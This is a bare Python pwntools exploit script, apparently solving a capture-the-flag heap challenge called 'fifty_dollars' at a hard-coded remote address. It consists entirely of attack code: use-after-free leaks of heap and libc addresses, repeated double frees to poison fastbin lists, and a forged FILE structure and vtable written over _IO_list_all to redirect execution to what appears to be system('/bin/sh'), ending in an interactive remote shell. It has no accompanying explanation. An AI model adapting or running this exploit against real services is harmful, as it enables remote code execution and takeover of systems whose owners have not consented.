from pwn import *

#r = process(["./fifty_dollars"])
r = remote("178.62.40.102",6001)
def alloca(idx,content):
	r.sendlineafter(":","1")
	r.sendlineafter(":",str(idx))
	r.sendafter(":",content)

def show(idx):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx))

def remove(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))



alloca(0,"\x00"*0x48+p64(0x60))
alloca(2,"\x00")
alloca(1,"\x00")
alloca(1,"\x00")
alloca(1,"\x00")
alloca(3,"\x00")
alloca(4,"\x00")

alloca(5,"\x00")
alloca(6,"\x00")

remove(1)
remove(0)

show(0)

heap = u64(r.recvn(6).ljust(8,'\x00'))-0x180

print hex(heap)

remove(1)

alloca(1,p64(heap+0x50))
alloca(1,"a")
alloca(1,"a")
alloca(1,"\x00"*0x8+p64(0x121))
remove(2)

show(2)
libc =  u64(r.recvn(6).ljust(8,'\x00'))-0x3c4b78
print hex(libc)

io_list_all = libc+0x3c5520
remove(3)
remove(4)
remove(3)
alloca(0,p64(heap+0x50))
alloca(0,"\x00"*0x48+p64(0x61))
alloca(0,"a")
alloca(0,
"/bin/sh\x00"+p64(0xb1)+
p64(0)+p64(io_list_all-0x10)+"\x00"*0x28+p64(0x61)
)

wide = heap+0x1e0
vtable = heap+0x1e0+0x28

remove(3)
remove(4)
remove(3)
alloca(0,p64(heap+0xc0))
alloca(0,"a")
alloca(0,"a")
alloca(0,"\x00"*0x30+p64(wide)+p64(0x61))


remove(3)
remove(4)
remove(3)
alloca(0,p64(heap+0x100))
alloca(0,"a")
alloca(0,p64(0x1)+p64(0x2)+p64(0x3)+p64(0x0)*3+p64(libc+0x45390))
alloca(0,"\x00"*0x10+p64(0x1)+"\x00"*0x10+p64(vtable)+p64(0x61))
alloca(0,"")

r.interactive()


